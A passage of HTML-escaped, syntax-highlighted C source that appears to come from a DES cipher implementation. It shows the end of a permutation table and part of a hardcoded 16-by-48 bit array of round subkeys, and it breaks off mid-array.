	 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; SubKey[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
